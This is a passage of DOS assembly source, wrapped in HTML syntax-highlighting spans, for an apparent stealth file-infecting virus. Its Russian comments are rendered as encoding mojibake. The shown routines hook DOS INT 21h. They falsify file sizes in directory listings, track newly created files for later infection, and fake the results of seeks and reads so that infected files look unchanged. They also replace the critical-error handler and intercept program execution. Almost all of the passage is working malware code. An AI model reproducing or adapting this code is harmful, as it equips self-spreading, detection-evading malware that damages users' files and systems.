</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;‡ ¤ ç  - ¯¥p¥­¥áâ¨ ¯ãâì ¤® ¨áª ¥¬ëå ä ©«®¢                                 ³</span><span class="sc0">
</span><span class="sc1">;DS:DX - ¯ãâì                                                              ;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_714F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:SI -&gt; ES:DI                                     ;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">function_714E_714F</span><span class="sc0">                                        </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_4</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc5">function_714E_714F</span><span class="sc4">:</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_stealth_714F</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;ES:DI - áâpãªâãp  ¤ ­­ëå                                          ;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">q_file_infected</span><span class="sc0">                                           </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth_714E_714F</span><span class="sc0">                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_714F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">seach_name_from_path</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ˆ¬ï ä ©«                                     ;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">;DS:SI -&gt; ES:DI                                    ;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_714F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">return_original_size_of_file</span><span class="sc0">                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth_714E_714F</span><span class="sc0">                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_clc_stealth_714E_714F</span><span class="sc4">:</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_stc_stealth_714F</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">function_3B_5C</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_5</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;DS:DX - ¨¬ï ä ©«                                                          ;³</span><span class="sc0">
</span><span class="sc5">function_3B_5C</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_function_3B_5C</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_after_copy_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">;DS:SI -&gt; ES:DI                                    ;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;HANDLE ª®¯¨pã¥¬®£® ä ©«                       ;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_stc_function_3B_5C</span><span class="sc4">:</span><span class="sc0">                                                   </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_6</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;“áâ ­®¢¨âì ãª § â¥«ì ä ©«  ­  ª®­¥æ + CX:DX                               ;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_handle</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_set_old_int_24_jmpint21</span><span class="sc0">                             </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                                                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_7</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;—¨â îâ ä ©«                                                               ;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_handle</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">GATE1_set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE2_set_old_int_24_jmpint21</span><span class="sc0">                             </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">; áç¨â ¥¬ áª®«ìª® ¬®¦­® ¯p®ç¨â âì ¨§ ä ©«                         ;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_current</span><span class="sc0">                                         </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;BX.CX - p¨£¨­ «ì­ ï ¤«¨­­  § p ¦¥­­®£® ä ©«                      ;³</span><span class="sc0">
        </span><span class="sc1">;DX.AX - Current LSEEK                                             ;³</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">lseek_biger</span><span class="sc0">                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">lseek_no_biger</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">lseek_biger</span><span class="sc4">:</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_file_3D</span><span class="sc0">                                              </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">lseek_no_biger</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">check_smallers</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_file_3D</span><span class="sc0">                                              </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">check_smallers</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;CX - ª®«¨ç¥áâ¢® ¡ ©â ª®â®p®¥ ¢®§¬®¦­® ¯p®ç¨â âì                   ;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Š®«¨ç¥áâ¢® ¡ ©â ª®â®p®¥ å®âïâ ¯p®ç¨â âì               ;³</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">read_file_3D</span><span class="sc0">                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">read_file_3D</span><span class="sc4">:</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real_number_of_readed_bate</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; ‘â ¢¨¬ áâ p®¥ 24'®¥ ¯à¥àë¢ ­¨¥            ;³</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real_number_of_readed_bate</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_read_file_3D</span><span class="sc0">                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real_number_of_readed_bate</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">move_faked_bytes</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_stc_read_file_3D</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_our_int24</span><span class="sc0">  </span><span class="sc1">; ‘â ¢¨¬ ­ è¥ 24 ¯à¥àë¢ ­¨¥</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">       </span><span class="sc1">; ‚ë¯®«­¨âì ä ©«</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_8</span><span class="sc0">
